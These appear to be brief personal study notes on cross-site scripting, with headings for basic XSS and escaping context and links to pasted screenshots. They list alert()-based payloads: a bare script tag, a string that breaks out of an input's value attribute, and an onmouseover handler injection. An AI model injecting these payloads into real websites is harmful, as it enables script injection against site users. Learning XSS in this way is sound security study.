____

# Basic XSS

```html
<script>alert("1")</script>
```

![[Pasted image 20241120124025.png]]

# Escaping Context

## Input

```html
<input value="test">
```

```html
"><script>alert(1)</script>
```

![[Pasted image 20241120125055.png]]

```html
" onmouseover=alert(1);//
```

![[Pasted image 20241120125551.png]]

## Textarea

